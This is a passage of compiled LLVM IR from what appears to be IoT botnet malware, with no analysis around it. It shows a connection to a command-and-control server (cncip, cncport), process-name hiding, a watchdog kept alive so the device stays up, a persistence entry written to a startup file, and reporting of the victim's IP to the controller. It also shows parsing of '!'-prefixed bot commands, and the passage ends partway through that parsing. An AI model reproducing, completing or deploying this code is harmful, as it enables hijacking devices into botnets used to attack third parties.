declare i32 @killer_kill(...) #5

declare i32 @killer_init(...) #5

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %3, i8 0, i64 4096, i1 false)
  %4 = load i32, i32* @mainCommSock, align 4
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %6, label %9

6:                                                ; preds = %0
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = call i32 @close(i32 %7)
  store i32 0, i32* @mainCommSock, align 4
  br label %9

9:                                                ; preds = %6, %0
  %10 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %11 = load i8*, i8** @cncip, align 8
  %12 = call i8* @strcpy(i8* %10, i8* %11) #12
  %13 = call i32 @socket(i32 2, i32 1, i32 0) #12
  store i32 %13, i32* @mainCommSock, align 4
  %14 = load i32, i32* @mainCommSock, align 4
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %16 = load i32, i32* @cncport, align 4
  %17 = call i32 @connectTimeout(i32 %14, i8* %15, i32 %16, i32 30)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %20, label %19

19:                                               ; preds = %9
  store i32 1, i32* %1, align 4
  br label %21

20:                                               ; preds = %9
  store i32 0, i32* %1, align 4
  br label %21

21:                                               ; preds = %20, %19
  %22 = load i32, i32* %1, align 4
  ret i32 %22
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #12
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

16:                                               ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %17, i8 0, i64 16, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.128, i64 0, i64 0)) #12
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #15
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

29:                                               ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

30:                                               ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #12
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

37:                                               ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.129, i64 0, i64 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

42:                                               ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

47:                                               ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.130, i64 0, i64 0)) #11
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

51:                                               ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  store i8* %52, i8** %9, align 8
  br label %53

53:                                               ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

58:                                               ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53, !llvm.loop !47

61:                                               ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

63:                                               ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %64, i8 0, i64 4096, i1 false)
  br label %42, !llvm.loop !48

65:                                               ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

71:                                               ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.5* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i64 0, i64 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #12
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #12
  store i32 0, i32* %10, align 4
  br label %79

79:                                               ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

82:                                               ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.6* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i64 0, i64 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

94:                                               ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79, !llvm.loop !49

97:                                               ; preds = %79
  br label %98

98:                                               ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 %99)
  br label %101

101:                                              ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [256 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca [256 x i8], align 16
  %15 = alloca [1024 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct._IO_FILE*, align 8
  %19 = alloca [4096 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca [1024 x i8], align 16
  %29 = alloca i32, align 4
  %30 = alloca [10 x i8*], align 16
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i64 0, i64 0), i8** %6, align 8
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i64 @strlen(i8* %39) #11
  %41 = call i8* @strncpy(i8* %36, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i64 0, i64 0), i64 %40) #12
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i64 0, i64 0), i8** %43, align 8
  %44 = load i8*, i8** %6, align 8
  %45 = ptrtoint i8* %44 to i64
  %46 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %45, i32 0, i32 0, i32 0)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = call i32 @getpid() #12
  %49 = xor i32 %47, %48
  call void @srand(i32 %49) #12
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = call i32 @getpid() #12
  %52 = xor i32 %50, %51
  call void @init_rand(i32 %52)
  store i32 0, i32* %7, align 4
  %53 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.131, i64 0, i64 0))
  %54 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.132, i64 0, i64 0))
  store i32 0, i32* %8, align 4
  %55 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.133, i64 0, i64 0), i32 2)
  store i32 %55, i32* %8, align 4
  %56 = icmp ne i32 %55, -1
  br i1 %56, label %60, label %57

57:                                               ; preds = %2
  %58 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.134, i64 0, i64 0), i32 2)
  store i32 %58, i32* %8, align 4
  %59 = icmp ne i32 %58, -1
  br i1 %59, label %60, label %71

60:                                               ; preds = %57, %2
  store i32 1, i32* %9, align 4
  %61 = load i32, i32* %8, align 4
  %62 = call i32 (i32, i64, ...) @ioctl(i32 %61, i64 2147768068, i32* %9) #12
  %63 = call i32 @fork() #12
  store i32 %63, i32* %10, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %70

65:                                               ; preds = %60
  br label %66

66:                                               ; preds = %65, %66
  %67 = load i32, i32* %8, align 4
  %68 = call i32 (i32, i64, ...) @ioctl(i32 %67, i64 2147768069, i32 0) #12
  %69 = call i32 @sleep(i32 10)
  br label %66

70:                                               ; preds = %60
  br label %71

71:                                               ; preds = %70, %57
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.135, i64 0, i64 0), i8** %12, align 8
  %72 = load i8*, i8** %12, align 8
  %73 = call noalias %struct._IO_FILE* @fopen(i8* %72, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i64 0, i64 0))
  store %struct._IO_FILE* %73, %struct._IO_FILE** %13, align 8
  %74 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %75 = icmp eq %struct._IO_FILE* %74, null
  br i1 %75, label %76, label %79

76:                                               ; preds = %71
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.137, i64 0, i64 0), i8** %12, align 8
  %77 = load i8*, i8** %12, align 8
  %78 = call noalias %struct._IO_FILE* @fopen(i8* %77, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i64 0, i64 0))
  store %struct._IO_FILE* %78, %struct._IO_FILE** %13, align 8
  br label %79

79:                                               ; preds = %76, %71
  %80 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %81 = icmp ne %struct._IO_FILE* %80, null
  br i1 %81, label %82, label %159

82:                                               ; preds = %79
  %83 = load i8**, i8*** %5, align 8
  %84 = getelementptr inbounds i8*, i8** %83, i64 0
  %85 = load i8*, i8** %84, align 8
  %86 = call i64 @strlen(i8* %85) #11
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %16, align 4
  store i32 0, i32* %17, align 4
  %88 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %89 = call i8* @getcwd(i8* %88, i64 256) #12
  %90 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %91 = call i32 @strcmp(i8* %90, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i64 0, i64 0)) #11
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %155

93:                                               ; preds = %82
  br label %94

94:                                               ; preds = %104, %93
  %95 = load i8**, i8*** %5, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 0
  %97 = load i8*, i8** %96, align 8
  %98 = load i32, i32* %16, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8, i8* %97, i64 %99
  %101 = load i8, i8* %100, align 1
  %102 = sext i8 %101 to i32
  %103 = icmp ne i32 %102, 47
  br i1 %103, label %104, label %107

104:                                              ; preds = %94
  %105 = load i32, i32* %16, align 4
  %106 = add nsw i32 %105, -1
  store i32 %106, i32* %16, align 4
  br label %94, !llvm.loop !50

107:                                              ; preds = %94
  %108 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i64 0, i64 0
  %109 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %110 = load i8**, i8*** %5, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 0
  %112 = load i8*, i8** %111, align 8
  %113 = load i32, i32* %16, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = call i32 (i8*, i8*, ...) @sprintf(i8* %108, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.138, i64 0, i64 0), i8* %109, i8* %115) #12
  br label %117

117:                                              ; preds = %133, %107
  %118 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %119 = call i32 @feof(%struct._IO_FILE* %118) #12
  %120 = icmp ne i32 %119, 0
  %121 = xor i1 %120, true
  br i1 %121, label %122, label %134

122:                                              ; preds = %117
  %123 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i64 0, i64 0
  %124 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %125 = call i8* @fgets(i8* %123, i32 1024, %struct._IO_FILE* %124)
  %126 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i64 0, i64 0
  %127 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i64 0, i64 0
  %128 = call i32 @strcasecmp(i8* %126, i8* %127) #11
  %129 = icmp ne i32 %128, 0
  br i1 %129, label %133, label %130

130:                                              ; preds = %122
  %131 = load i32, i32* %17, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %17, align 4
  br label %133

133:                                              ; preds = %130, %122
  br label %117, !llvm.loop !51

134:                                              ; preds = %117
  %135 = load i32, i32* %17, align 4
  %136 = icmp eq i32 %135, 0
  br i1 %136, label %137, label %151

137:                                              ; preds = %134
  %138 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %139 = call i32 @fclose(%struct._IO_FILE* %138)
  %140 = load i8*, i8** %12, align 8
  %141 = call noalias %struct._IO_FILE* @fopen(i8* %140, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i64 0, i64 0))
  store %struct._IO_FILE* %141, %struct._IO_FILE** %18, align 8
  %142 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %143 = icmp ne %struct._IO_FILE* %142, null
  br i1 %143, label %144, label %150

144:                                              ; preds = %137
  %145 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i64 0, i64 0
  %146 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %147 = call i32 @fputs(i8* %145, %struct._IO_FILE* %146)
  %148 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %149 = call i32 @fclose(%struct._IO_FILE* %148)
  br label %150

150:                                              ; preds = %144, %137
  br label %154

151:                                              ; preds = %134
  %152 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %153 = call i32 @fclose(%struct._IO_FILE* %152)
  br label %154

154:                                              ; preds = %151, %150
  br label %158

155:                                              ; preds = %82
  %156 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %157 = call i32 @fclose(%struct._IO_FILE* %156)
  br label %158

158:                                              ; preds = %155, %154
  br label %159

159:                                              ; preds = %158, %79
  %160 = call i32 @getOurIP()
  %161 = call i32 @fork() #12
  %162 = icmp sgt i32 %161, 0
  br i1 %162, label %163, label %164

163:                                              ; preds = %159
  ret i32 0

164:                                              ; preds = %159
  %165 = call i32 @setsid() #12
  store i32 %165, i32* @pgid, align 4
  %166 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i64 0, i64 0)) #12
  %167 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #12
  br label %168

168:                                              ; preds = %164, %171, %459
  %169 = call i32 @initConnection()
  %170 = icmp ne i32 %169, 0
  br i1 %170, label %171, label %173

171:                                              ; preds = %168
  %172 = call i32 @sleep(i32 5)
  br label %168

173:                                              ; preds = %168
  %174 = load i32, i32* @mainCommSock, align 4
  %175 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %176 = call i8* @inet_ntoa(i32 %175) #12
  %177 = call i32 (i32, i8*, ...) @sockprintf(i32 %174, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.140, i64 0, i64 0), i8* %176, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i64 0, i64 0))
  store i32 0, i32* %20, align 4
  store i32 0, i32* %21, align 4
  br label %178

178:                                              ; preds = %458, %377, %299, %267, %173
  %179 = load i32, i32* @mainCommSock, align 4
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 0
  %181 = call i32 @recvLine(i32 %179, i8* %180, i32 4096)
  store i32 %181, i32* %20, align 4
  %182 = icmp ne i32 %181, -1
  br i1 %182, label %183, label %459

183:                                              ; preds = %178
  store i32 0, i32* %21, align 4
  br label %184

184:                                              ; preds = %255, %183
  %185 = load i32, i32* %21, align 4
  %186 = sext i32 %185 to i64
  %187 = load i64, i64* @numpids, align 8
  %188 = icmp ult i64 %186, %187
  br i1 %188, label %189, label %258

189:                                              ; preds = %184
  %190 = load i32*, i32** @pids, align 8
  %191 = load i32, i32* %21, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds i32, i32* %190, i64 %192
  %194 = load i32, i32* %193, align 4
  %195 = call i32 @waitpid(i32 %194, i32* null, i32 1)
  %196 = icmp sgt i32 %195, 0
  br i1 %196, label %197, label %254

197:                                              ; preds = %189
  %198 = load i32, i32* %21, align 4
  %199 = add nsw i32 %198, 1
  store i32 %199, i32* %23, align 4
  br label %200

200:                                              ; preds = %216, %197
  %201 = load i32, i32* %23, align 4
  %202 = zext i32 %201 to i64
  %203 = load i64, i64* @numpids, align 8
  %204 = icmp ult i64 %202, %203
  br i1 %204, label %205, label %219

205:                                              ; preds = %200
  %206 = load i32*, i32** @pids, align 8
  %207 = load i32, i32* %23, align 4
  %208 = zext i32 %207 to i64
  %209 = getelementptr inbounds i32, i32* %206, i64 %208
  %210 = load i32, i32* %209, align 4
  %211 = load i32*, i32** @pids, align 8
  %212 = load i32, i32* %23, align 4
  %213 = sub i32 %212, 1
  %214 = zext i32 %213 to i64
  %215 = getelementptr inbounds i32, i32* %211, i64 %214
  store i32 %210, i32* %215, align 4
  br label %216

216:                                              ; preds = %205
  %217 = load i32, i32* %23, align 4
  %218 = add i32 %217, 1
  store i32 %218, i32* %23, align 4
  br label %200, !llvm.loop !52

219:                                              ; preds = %200
  %220 = load i32*, i32** @pids, align 8
  %221 = load i32, i32* %23, align 4
  %222 = sub i32 %221, 1
  %223 = zext i32 %222 to i64
  %224 = getelementptr inbounds i32, i32* %220, i64 %223
  store i32 0, i32* %224, align 4
  %225 = load i64, i64* @numpids, align 8
  %226 = add i64 %225, -1
  store i64 %226, i64* @numpids, align 8
  %227 = load i64, i64* @numpids, align 8
  %228 = add i64 %227, 1
  %229 = mul i64 %228, 4
  %230 = call noalias align 16 i8* @malloc(i64 %229) #12
  %231 = bitcast i8* %230 to i32*
  store i32* %231, i32** %22, align 8
  store i32 0, i32* %23, align 4
  br label %232

232:                                              ; preds = %247, %219
  %233 = load i32, i32* %23, align 4
  %234 = zext i32 %233 to i64
  %235 = load i64, i64* @numpids, align 8
  %236 = icmp ult i64 %234, %235
  br i1 %236, label %237, label %250

237:                                              ; preds = %232
  %238 = load i32*, i32** @pids, align 8
  %239 = load i32, i32* %23, align 4
  %240 = zext i32 %239 to i64
  %241 = getelementptr inbounds i32, i32* %238, i64 %240
  %242 = load i32, i32* %241, align 4
  %243 = load i32*, i32** %22, align 8
  %244 = load i32, i32* %23, align 4
  %245 = zext i32 %244 to i64
  %246 = getelementptr inbounds i32, i32* %243, i64 %245
  store i32 %242, i32* %246, align 4
  br label %247

247:                                              ; preds = %237
  %248 = load i32, i32* %23, align 4
  %249 = add i32 %248, 1
  store i32 %249, i32* %23, align 4
  br label %232, !llvm.loop !53

250:                                              ; preds = %232
  %251 = load i32*, i32** @pids, align 8
  %252 = bitcast i32* %251 to i8*
  call void @free(i8* %252) #12
  %253 = load i32*, i32** %22, align 8
  store i32* %253, i32** @pids, align 8
  br label %254

254:                                              ; preds = %250, %189
  br label %255

255:                                              ; preds = %254
  %256 = load i32, i32* %21, align 4
  %257 = add nsw i32 %256, 1
  store i32 %257, i32* %21, align 4
  br label %184, !llvm.loop !54

258:                                              ; preds = %184
  %259 = load i32, i32* %20, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 %260
  store i8 0, i8* %261, align 1
  %262 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 0
  call void @trim(i8* %262)
  %263 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 0
  %264 = call i8* @strstr(i8* %263, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0)) #11
  %265 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 0
  %266 = icmp eq i8* %264, %265
  br i1 %266, label %267, label %270

267:                                              ; preds = %258
  %268 = load i32, i32* @mainCommSock, align 4
  %269 = call i32 (i32, i8*, ...) @sockprintf(i32 %268, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.142, i64 0, i64 0))
  br label %178, !llvm.loop !55

270:                                              ; preds = %258
  %271 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 0
  store i8* %271, i8** %24, align 8
  %272 = load i8*, i8** %24, align 8
  %273 = load i8, i8* %272, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp eq i32 %274, 33
  br i1 %275, label %276, label %458

276:                                              ; preds = %270
  %277 = load i8*, i8** %24, align 8
  %278 = getelementptr inbounds i8, i8* %277, i64 1
  store i8* %278, i8** %25, align 8
  br label %279

279:                                              ; preds = %291, %276
  %280 = load i8*, i8** %25, align 8
  %281 = load i8, i8* %280, align 1
  %282 = zext i8 %281 to i32
  %283 = icmp ne i32 %282, 32
  br i1 %283, label %284, label %289

284:                                              ; preds = %279
  %285 = load i8*, i8** %25, align 8
  %286 = load i8, i8* %285, align 1
  %287 = zext i8 %286 to i32
  %288 = icmp ne i32 %287, 0
  br label %289

289:                                              ; preds = %284, %279
  %290 = phi i1 [ false, %279 ], [ %288, %284 ]
  br i1 %290, label %291, label %294

291:                                              ; preds = %289
  %292 = load i8*, i8** %25, align 8
  %293 = getelementptr inbounds i8, i8* %292, i32 1
  store i8* %293, i8** %25, align 8
  br label %279, !llvm.loop !56

294:                                              ; preds = %289
  %295 = load i8*, i8** %25, align 8
  %296 = load i8, i8* %295, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp eq i32 %297, 0
  br i1 %298, label %299, label %300

299:                                              ; preds = %294
  br label %178, !llvm.loop !55

300:                                              ; preds = %294
  %301 = load i8*, i8** %25, align 8
  store i8 0, i8* %301, align 1
  %302 = load i8*, i8** %24, align 8
  %303 = getelementptr inbounds i8, i8* %302, i64 1
  store i8* %303, i8** %25, align 8
  %304 = load i8*, i8** %24, align 8
  %305 = load i8*, i8** %25, align 8
  %306 = call i64 @strlen(i8* %305) #11
  %307 = getelementptr inbounds i8, i8* %304, i64 %306
  %308 = getelementptr inbounds i8, i8* %307, i64 2
  store i8* %308, i8** %24, align 8
  br label %309

309:                                              ; preds = %329, %300
  %310 = load i8*, i8** %24, align 8
  %311 = load i8*, i8** %24, align 8
  %312 = call i64 @strlen(i8* %311) #11
  %313 = sub i64 %312, 1
  %314 = getelementptr inbounds i8, i8* %310, i64 %313
  %315 = load i8, i8* %314, align 1
  %316 = zext i8 %315 to i32
  %317 = icmp eq i32 %316, 10
  br i1 %317, label %327, label %318

318:                                              ; preds = %309
  %319 = load i8*, i8** %24, align 8
  %320 = load i8*, i8** %24, align 8
  %321 = call i64 @strlen(i8* %320) #11
  %322 = sub i64 %321, 1
  %323 = getelementptr inbounds i8, i8* %319, i64 %322
  %324 = load i8, i8* %323, align 1
  %325 = zext i8 %324 to i32
  %326 = icmp eq i32 %325, 13
  br label %327

327:                                              ; preds = %318, %309
  %328 = phi i1 [ true, %309 ], [ %326, %318 ]
  br i1 %328, label %329, label %335

329:                                              ; preds = %327
  %330 = load i8*, i8** %24, align 8
  %331 = load i8*, i8** %24, align 8
  %332 = call i64 @strlen(i8* %331) #11
  %333 = sub i64 %332, 1
  %334 = getelementptr inbounds i8, i8* %330, i64 %333
  store i8 0, i8* %334, align 1
  br label %309, !llvm.loop !57

335:                                              ; preds = %327
  %336 = load i8*, i8** %24, align 8
  store i8* %336, i8** %26, align 8
  br label %337

337:                                              ; preds = %349, %335
  %338 = load i8*, i8** %24, align 8
  %339 = load i8, i8* %338, align 1
  %340 = zext i8 %339 to i32
  %341 = icmp ne i32 %340, 32
  br i1 %341, label %342, label %347

342:                                              ; preds = %337
  %343 = load i8*, i8** %24, align 8
  %344 = load i8, i8* %343, align 1
  %345 = zext i8 %344 to i32
  %346 = icmp ne i32 %345, 0
  br label %347

347:                                              ; preds = %342, %337
  %348 = phi i1 [ false, %337 ], [ %346, %342 ]
  br i1 %348, label %349, label %352

349:                                              ; preds = %347
  %350 = load i8*, i8** %24, align 8
  %351 = getelementptr inbounds i8, i8* %350, i32 1
  store i8* %351, i8** %24, align 8
  br label %337, !llvm.loop !58

352:                                              ; preds = %347
  %353 = load i8*, i8** %24, align 8
  store i8 0, i8* %353, align 1
  %354 = load i8*, i8** %24, align 8
  %355 = getelementptr inbounds i8, i8* %354, i32 1
  store i8* %355, i8** %24, align 8
  %356 = load i8*, i8** %26, align 8
  store i8* %356, i8** %27, align 8
  br label %357

357:                                              ; preds = %361, %352
  %358 = load i8*, i8** %27, align 8
  %359 = load i8, i8* %358, align 1
  %360 = icmp ne i8 %359, 0
  br i1 %360, label %361, label %370

361:                                              ; preds = %357
  %362 = load i8*, i8** %27, align 8
  %363 = load i8, i8* %362, align 1
  %364 = zext i8 %363 to i32
  %365 = call i32 @toupper(i32 %364) #11
  %366 = trunc i32 %365 to i8
  %367 = load i8*, i8** %27, align 8
